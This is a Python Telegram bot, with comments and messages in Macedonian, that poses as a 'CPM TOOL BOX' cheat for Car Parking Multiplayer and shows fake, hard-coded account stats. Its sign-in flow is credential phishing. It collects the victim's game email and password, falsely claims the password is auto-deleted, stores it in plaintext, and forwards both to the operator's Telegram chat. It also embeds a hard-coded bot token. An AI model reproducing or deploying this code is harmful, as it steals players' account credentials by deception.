import logging
import sqlite3
import asyncio
import re
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# Конфигурирање на логирање
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Точниот токен и ADMIN ID
BOT_TOKEN = "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc" 
ADMIN_ID = 8694942406  

# Симулирани CPM податоци
CPM_DATA = {
    'money': 48729000,
    'coins': 20400,
    'wins': 16,
    'losses': 0,
    'levels': 109,
    'wheels': 112,
    'animations': 42,
    'friends': 0,
    'id': 'VY704074'
}

def inicijaliziraj_baza():
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS licenci 
                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, email TEXT, password TEXT, username TEXT)''')
    conn.commit()
    conn.close()

inicijaliziraj_baza()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user if update.message else update.callback_query.from_user
    username = user.username if user.username else "N/A"

    # АКО Е АДМИН - ПРИКАЖИ АДМИН МЕНИ
    if user.id == ADMIN_ID:
        admin_text = (
            "**🛡️ CPM_AJHAN_BOT - ADMIN PANEL**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👑 Добредојде Администраторе!\n\n"
            "📊 Изберете опција:"
        )
        keyboard = [
            [InlineKeyboardButton("📋 Список на корисници", callback_data="admin_list_users")],
            [InlineKeyboardButton("🗑️ Избриши корисник", callback_data="admin_remove_user")],
            [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
            [InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]
        ]
        if update.message:
            await update.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        elif update.callback_query:
            await update.callback_query.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('SELECT data, odobren, email FROM licenci WHERE id = ?', (str(user.id),))
    rezultat = cursor.fetchone()
    conn.close()

    sega = datetime.now()
    dozvolen = False
    email = ""

    if rezultat:
        istekuvanje_str = rezultat[0]
        odobren = rezultat[1] if len(rezultat) > 1 else 0
        email = rezultat[2] if len(rezultat) > 2 and rezultat[2] else ""
        
        if odobren == 1:
            if istekuvanje_str == "forever":
                dozvolen = True
            else:
                try:
                    dozvolen_sega = datetime.strptime(istekuvanje_str, "%Y-%m-%d %H:%M:%S")
                    if dozvolen_sega > sega:
                        dozvolen = True
                except ValueError:
                    dozvolen = False

    if not dozvolen:
        welcome_text = (
            "**CPM_AJHAN_BOT**\n"
            "bot\n\n"
            "---\n"
            "**CPM TOOL BOX v4.0**\n"
            "---\n"
            f"**WELCOME**\n"
            f"@{username}\n"
            f"ID {user.id}\n"
            f"{sega.strftime('%d %b %Y • %I:%M %p')}\n\n"
            "- Sign in with your CPM credentials\n"
            "**05:10**\n\n"
            "**Sign In**"
        )
        
        keyboard = [[InlineKeyboardButton("🔑 Sign In", callback_data="cpm_signin")]]
        
        if update.message:
            await update.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        elif update.callback_query:
            await update.callback_query.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # ДОЗВОЛЕН КОРИСНИК - ПРИКАЖИ DASHBOARD
    dashboard_text = (
        "**CPM_AJHAN_BOT**\n"
        "bot\n\n"
        "---\n"
        "**DASHBOARD**\n"
        "---\n"
        "**ACCOUNT**\n"
        f"{email if email else 'senatkafkast@gmail.com'}\n"
        f"2best\n"
        f"ID {CPM_DATA['id']}\n\n"
        "**STATS**\n"
        f"${CPM_DATA['money']:,}\n"
        f"{CPM_DATA['coins']:,} coins\n"
        f"{CPM_DATA['wins']}W / {CPM_DATA['losses']}L\n"
        f"{CPM_DATA['levels']} levels done\n"
        f"{CPM_DATA['wheels']} wheels\n"
        f"{CPM_DATA['animations']} animations\n"
        f"{CPM_DATA['friends']} friends\n\n"
        "- Select an option below:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Money", callback_data="menu_money"), InlineKeyboardButton("🪙 Coins", callback_data="menu_coins")],
        [InlineKeyboardButton("⚡ Features", callback_data="menu_features"), InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")],
        [InlineKeyboardButton("🔄 Refresh Account", callback_data="refresh_account")],
        [InlineKeyboardButton("🚪 Sign Out", callback_data="sign_out")]
    ]
    
    if update.message:
        await update.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**MONEY**\n\n"
        f"Max: ${CPM_DATA['money']:,}"
    )
    
    keyboard = [
        [InlineKeyboardButton("$1M", callback_data="add_money_1m"), InlineKeyboardButton("$5M", callback_data="add_money_5m"), InlineKeyboardButton("$10M", callback_data="add_money_10m")],
        [InlineKeyboardButton("$25M", callback_data="add_money_25m"), InlineKeyboardButton("$50M ★", callback_data="add_money_50m")],
        [InlineKeyboardButton("💰 Custom Amount", callback_data="custom_money")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**COINS**\n\n"
        f"Max: {CPM_DATA['coins']:,}"
    )
    
    keyboard = [
        [InlineKeyboardButton("100K", callback_data="add_coins_100k"), InlineKeyboardButton("250K", callback_data="add_coins_250k"), InlineKeyboardButton("500K ★", callback_data="add_coins_500k")],
        [InlineKeyboardButton("🪙 Custom Amount", callback_data="custom_coins")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**FEATURES**\n"
        "Select a feature or UNLOCK ALL:"
    )
    
    keyboard = [
        [InlineKeyboardButton("🏎️ W16", callback_data="feature_w16"), InlineKeyboardButton("🛡️ No Dmg", callback_data="feature_no_dmg")],
        [InlineKeyboardButton("💨 Smoke", callback_data="feature_smoke"), InlineKeyboardButton("⚙️ Wheels", callback_data="feature_wheels")],
        [InlineKeyboardButton("📈 Levels", callback_data="feature_levels"), InlineKeyboardButton("⛽ Fuel", callback_data="feature_fuel")],
        [InlineKeyboardButton("📯 Horns", callback_data="feature_horns"), InlineKeyboardButton("🎭 Anims", callback_data="feature_anims")],
        [InlineKeyboardButton("🏠 Houses", callback_data="feature_houses"), InlineKeyboardButton("👑 Rank", callback_data="feature_rank")],
        [InlineKeyboardButton("🔓 UNLOCK ALL", callback_data="feature_unlock_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def cpm_signin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = "**CPM_AJHAN_BOT**\nbot\n\n---\n**ENTER EMAIL**\n---\n\nType your CPM email:"
    keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    context.user_data['sostojba'] = 'CEKA_EMAIL'

async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sostojba = context.user_data.get('sostojba')
    vnesen_tekst = update.message.text
    user = update.message.from_user
    username = user.username if user.username else "N/A"

    # АКО КОРИСНИКОТ ВНЕСУВА CUSTOM AMOUNT ЗА ПАРИ
    if sostojba == 'CUSTOM_MONEY':
        try:
            vnes = vnesen_tekst.strip().lower()
            
            # Парсирање на вредноста
            if vnes.endswith('m'):
                amount = int(float(vnes[:-1]) * 1000000)
                display = f"{vnes[:-1]}M"
            elif vnes.endswith('k'):
                amount = int(float(vnes[:-1]) * 1000)
                display = f"{vnes[:-1]}K"
            else:
                amount = int(vnes)
                display = f"{amount:,}"
            
            # ПРАЌАЊЕ ДО АДМИН
            admin_poraka = (
                f"💰 **Барање за пари**\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 **Корисник:** @{username}\n"
                f"🆔 **ID:** `{user.id}`\n"
                f"💵 **Износ:** `${amount:,}`\n"
                f"📝 **Внесено:** {vnes}\n"
                f"⏰ {datetime.now().strftime('%H:%M')}\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
            
            try:
                await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
                await update.message.reply_text(f"✅ **Барањето за ${amount:,} е испратено до администраторот!**\n\n⏳ Ве молиме почекајте одобрение.", parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Грешка при праќање до админ: {e}")
                await update.message.reply_text("❌ Грешка при праќање на барањето. Обидете се повторно.")
            
        except ValueError:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 1000000, 10m, или 500k")
        
        context.user_data['sostojba'] = None
        return

    # АКО КОРИСНИКОТ ВНЕСУВА CUSTOM AMOUNT ЗА КОИНИ
    if sostojba == 'CUSTOM_COINS':
        try:
            vnes = vnesen_tekst.strip().lower()
            
            # Парсирање на вредноста
            if vnes.endswith('k'):
                amount = int(float(vnes[:-1]) * 1000)
                display = f"{vnes[:-1]}K"
            else:
                amount = int(vnes)
                display = f"{amount:,}"
            
            # ПРАЌАЊЕ ДО АДМИН
            admin_poraka = (
                f"🪙 **Барање за коини**\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 **Корисник:** @{username}\n"
                f"🆔 **ID:** `{user.id}`\n"
                f"🪙 **Износ:** {amount:,} coins\n"
                f"📝 **Внесено:** {vnes}\n"
                f"⏰ {datetime.now().strftime('%H:%M')}\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
            
            try:
                await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
                await update.message.reply_text(f"✅ **Барањето за {amount:,} коини е испратено до администраторот!**\n\n⏳ Ве молиме почекајте одобрение.", parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Грешка при праќање до админ: {e}")
                await update.message.reply_text("❌ Грешка при праќање на барањето. Обидете се повторно.")
            
        except ValueError:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 50000 или 100k")
        
        context.user_data['sostojba'] = None
        return

    # АКО АДМИНОТ ВНЕСУВА ID ЗА БРИШЕЊЕ
    if sostojba == 'CEKA_REMOVE_USER':
        try:
            target_user_id = int(vnesen_tekst)
            
            conn = sqlite3.connect('Licenci.db')
            cursor = conn.cursor()
            cursor.execute('SELECT username FROM licenci WHERE id = ?', (str(target_user_id),))
            user_data = cursor.fetchone()
            
            if not user_data:
                await update.message.reply_text("❌ Корисникот не е пронајден во базата!")
                context.user_data['sostojba'] = None
                return
            
            target_username = user_data[0] if user_data[0] else "N/A"
            
            cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_user_id),))
            conn.commit()
            conn.close()
            
            await update.message.reply_text(
                f"✅ **Корисникот е успешно избришан!**\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 ID: `{target_user_id}`\n"
                f"👤 Username: @{target_username}\n"
                f"━━━━━━━━━━━━━━━━━━━",
                parse_mode='Markdown'
            )
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text="❌ **Вашата лиценца е отстранета од администраторот!**"
                )
            except Exception as e:
                logger.error(f"Не може да се испрати порака до {target_user_id}: {e}")
            
            context.user_data['sostojba'] = None
            
            keyboard = [[InlineKeyboardButton("🔙 Назад во админ панел", callback_data="admin_panel")]]
            await update.message.reply_text(
                "🔙 Вратете се во админ панелот:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            
        except ValueError:
            await update.message.reply_text("❌ Внесете валидно ID (само бројки)!")
        return

    # АКО АДМИНОТ ВНЕСУВА CUSTOM ВРЕМЕ
    if sostojba == 'CEKA_CUSTOM_TIME':
        target_user_id = context.user_data.get('custom_target_user')
        vnes = vnesen_tekst.strip().lower()
        
        try:
            if vnes.endswith('h'):
                hours = int(vnes[:-1])
                if 1 <= hours <= 24:
                    vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
                    vreme_text = f"{hours} hours"
                else:
                    await update.message.reply_text("❌ Внесете 1h до 24h!")
                    return
            else:
                days = int(vnes)
                if 1 <= days <= 30:
                    vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
                    vreme_text = f"{days} days"
                else:
                    await update.message.reply_text("❌ Внесете 1 до 30 дена!")
                    return
            
            conn = sqlite3.connect('Licenci.db')
            cursor = conn.cursor()
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                          (str(target_user_id), vrednost))
            conn.commit()
            conn.close()
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"✅ Администраторот ви додели лиценца на {vreme_text}!"
                )
            except Exception as e:
                logger.error(f"Грешка: {e}")
            
            await update.message.reply_text(f"✅ Лиценцата е доделена на {vreme_text}!")
            context.user_data['sostojba'] = None
            
        except ValueError:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 5h или 10")
        return

    # АКО КОРИСНИКОТ ВНЕСУВА EMAIL
    if sostojba == 'CEKA_EMAIL':
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, vnesen_tekst):
            await update.message.reply_text("❌ Внесете валидна email адреса (пример: user@email.com):")
            return
        
        context.user_data['email'] = vnesen_tekst
        text = "**CPM_AJHAN_BOT**\nbot\n\n---\n**PASSWORD**\n---\n\nType your password:\n☑ Auto-deleted"
        keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
        
        await update.message.reply_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        context.user_data['sostojba'] = 'CEKA_PASSWORD'
        return

    # АКО КОРИСНИКОТ ВНЕСУВА PASSWORD
    elif sostojba == 'CEKA_PASSWORD':
        password = vnesen_tekst
        email = context.user_data.get('email')
        context.user_data['sostojba'] = None
        
        # Зачувување во база
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, 0, ?, ?, ?)', 
                      (str(user.id), "pending", email, password, username))
        conn.commit()
        conn.close()
        
        # ИСПРАЌАЊЕ ДО АДМИН
        admin_poraka = (
            f"🔐 **Нов профил внесен во ботот!**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Корисник:** @{username}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"📧 **E-маил:** `{email}`\n"
            f"🔑 **Лозинка:** `{password}`\n"
            f"⏰ {datetime.now().strftime('%H:%M')}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📌 **Статус:** Чека на одобрение"
        )
        
        keyboard_admin = [
            [InlineKeyboardButton("✅ Одобри пристап", callback_data=f"lic:approve:{user.id}")],
            [InlineKeyboardButton("❌ Одбиј", callback_data=f"lic:deny:{user.id}")]
        ]
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_poraka,
                reply_markup=InlineKeyboardMarkup(keyboard_admin),
                parse_mode='Markdown'
            )
            logger.info(f"✅ Испратени credentials за @{username} до администратор")
        except Exception as e:
            logger.error(f"❌ Грешка при праќање до администратор: {e}")
            await update.message.reply_text("❌ Грешка при праќање на податоците. Обидете се повторно.")
            return
        
        # НА КОРИСНИКОТ МУ СЕ ПОКАЖУВА ПОРАКА ЗА ЧЕКАЊЕ
        cekaj_poraka = (
            "⏳ **Чекање на одобрение**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "📧 Вашите податоци се испратени до администраторот.\n"
            "⏱️ Ве молиме почекајте **5-10 минути**.\n"
            "✅ Кликнете на копчето за да проверите дали сте одобрени.\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        
        keyboard = [[InlineKeyboardButton("🔄 Провери статус", callback_data="proveri_status")]]
        await update.message.reply_text(
            text=cekaj_poraka,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return
    
    # АКО КОРИСНИКОТ ИСПРАТИ НЕШТО ДРУГО - ПРАЌАМЕ ПОРАКА ДО АДМИН
    else:
        # Прати порака до администраторот
        admin_poraka = (
            f"📝 **Нова порака од корисник**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Корисник:** @{username}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"📩 **Порака:**\n`{vnesen_tekst}`\n"
            f"⏰ {datetime.now().strftime('%H:%M')}\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
            await update.message.reply_text("✅ **Вашата порака е испратена до администраторот!**\n\n⏳ Ве молиме почекајте одговор.", parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Грешка при праќање до админ: {e}")
            await update.message.reply_text("❌ Грешка при праќање на пораката. Обидете се повторно.")

async def obraboti_klikovi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    # ПРОВЕРКА НА СТАТУС
    if data == "proveri_status":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT odobren FROM licenci WHERE id = ?', (str(user.id),))
        rezultat = cursor.fetchone()
        conn.close()
        
        if rezultat and rezultat[0] == 1:
            await query.edit_message_text("✅ **Вашата најава е одобрена!**\n\nВе молиме напишете /start за да продолжите.", parse_mode='Markdown')
            return
        elif rezultat and rezultat[0] == 0:
            keyboard = [[InlineKeyboardButton("🔄 Провери статус", callback_data="proveri_status")]]
            await query.edit_message_text(
                "⏳ **Чекање на одобрение**\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "📧 Вашите податоци се испратени до администраторот.\n"
                "⏱️ Ве молиме почекајте **5-10 минути**.\n"
                "✅ Кликнете на копчето за да проверите дали сте одобрени.\n"
                "━━━━━━━━━━━━━━━━━━━",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
            return
        else:
            await query.edit_message_text("❌ Немате испратено барање. Напишете /start за да започнете.", parse_mode='Markdown')
            return

    # АДМИН КОМАНДИ
    if data == "admin_panel":
        await start(update, context)
        return
    
    if data == "admin_list_users":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT id, username, data, odobren, email FROM licenci ORDER BY odobren DESC')
        users = cursor.fetchall()
        conn.close()
        
        if not users:
            await query.edit_message_text("📋 **Нема корисници во базата.**", parse_mode='Markdown')
            return
        
        text = "📋 **СПИСОК НА КОРИСНИЦИ**\n━━━━━━━━━━━━━━━━━━━\n\n"
        for user_data in users:
            user_id, username, data, odobren, email = user_data
            status = "✅ Активиран" if odobren == 1 else "⏳ Чека одобрение"
            vreme = data if data else "Нема"
            email_display = email if email else "Нема email"
            text += f"🆔 `{user_id}`\n"
            text += f"👤 @{username if username else 'N/A'}\n"
            text += f"📧 {email_display}\n"
            text += f"📅 {vreme}\n"
            text += f"📊 {status}\n"
            text += "━━━━━━━━━━━━━━━━━━━\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return
    
    if data == "admin_remove_user":
        text = (
            "🗑️ **ИЗБРИШИ КОРИСНИК**\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Внесете го ID-то на корисникот.\n"
            "Пример: `8694942406`\n\n"
            "⚠️ **ВНИМАНИЕ:** Оваа акција е неповратна!"
        )
        await query.edit_message_text(text=text, parse_mode='Markdown')
        context.user_data['sostojba'] = 'CEKA_REMOVE_USER'
        return
    
    if data == "admin_stats":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM licenci')
        total_users = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 1')
        active_users = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 0')
        inactive_users = cursor.fetchone()[0]
        conn.close()
        
        text = (
            "📊 **СТАТИСТИКА**\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 Вкупно корисници: **{total_users}**\n"
            f"✅ Активни: **{active_users}**\n"
            f"⏳ Чекаат: **{inactive_users}**\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # АДМИН ЛИЦЕНЦИ
    if data.startswith("lic:"):
        delovi = data.split(":")
        akcija = delovi[1]
        target_user_id = int(delovi[2])
        
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        
        if akcija == "deny":
            cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_user_id),))
            poraka = "❌ Вашето барање за лиценца е одбиено."
            admin_odgovor = f"❌ Одбиен корисник {target_user_id}"
            conn.commit()
            conn.close()
            
            try:
                await context.bot.send_message(chat_id=target_user_id, text=poraka)
                await query.edit_message_text(text=admin_odgovor)
            except Exception as e:
                logger.error(f"Грешка: {e}")
            return
        
        elif akcija == "approve":
            vrednost = "forever"
            cursor.execute('UPDATE licenci SET data = ?, odobren = 1 WHERE id = ?', 
                          (vrednost, str(target_user_id)))
            conn.commit()
            conn.close()
            
            poraka = f"✅ **Вашата најава е одобрена!**\n\nВе молиме напишете /start за да продолжите."
            admin_odgovor = f"✅ **Одобрен пристап за корисникот {target_user_id}**"
            
            try:
                await context.bot.send_message(chat_id=target_user_id, text=poraka)
                await query.edit_message_text(text=admin_odgovor)
            except Exception as e:
                logger.error(f"Грешка: {e}")
            return
        
        elif akcija == "custom":
            await query.edit_message_text(
                text=f"⚙️ **Custom Time for user {target_user_id}**\n\n"
                     "📝 Внесете време:\n"
                     "• **5h** = 5 саати (1-24h)\n"
                     "• **10** = 10 дена (1-30 дена)\n\n"
                     "Пример: `12h` или `7`",
                parse_mode='Markdown'
            )
            context.user_data['sostojba'] = 'CEKA_CUSTOM_TIME'
            context.user_data['custom_target_user'] = target_user_id
            return
        
        else:
            if akcija == "forever":
                vrednost = "forever"
                vreme_text = "засекогаш"
            elif akcija == "30":
                vrednost = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
                vreme_text = "30 дена"
            elif akcija == "7":
                vrednost = (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d %H:%M:%S")
                vreme_text = "7 дена"
            else:
                vrednost = "forever"
                vreme_text = "засекогаш"
            
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                          (str(target_user_id), vrednost))
            conn.commit()
            conn.close()
            
            poraka = f"✅ Вашата лиценца е одобрена на {vreme_text}!"
            admin_odgovor = f"✅ Одобрена лиценца ({akcija}) за {target_user_id}"
            
            try:
                await context.bot.send_message(chat_id=target_user_id, text=poraka)
                await query.edit_message_text(text=admin_odgovor)
            except Exception as e:
                logger.error(f"Грешка: {e}")
        return

    # МЕНИЈА
    if data == "main_menu":
        await start(update, context)
